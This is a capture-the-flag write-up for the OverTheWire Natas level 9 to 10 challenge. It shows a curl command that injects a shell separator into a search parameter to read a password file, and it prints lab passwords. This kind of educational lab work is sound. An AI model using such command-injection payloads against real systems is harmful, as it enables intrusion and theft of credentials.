# Natas Level 09 to 10

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 9 -> 10 |
| Status | Complete |

## Objective

Exploit command injection in a search form.

## Given Access

User: `natas9`

Password:

```text
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

## Method

The source passes `needle` directly into `passthru("grep -i $key dictionary.txt")`. Inject a command separator and read the next password file.

## Commands

```bash
curl -s -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t \
  --get \
  --data-urlencode 'needle=;cat /etc/natas_webpass/natas10 #' \
  http://natas9.natas.labs.overthewire.org/
```

## Result

Password for `natas10`:

```text
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

## Lesson

Never concatenate user input into shell commands. Shell metacharacters turn search input into command execution.

## References

- https://overthewire.org/wargames/natas/
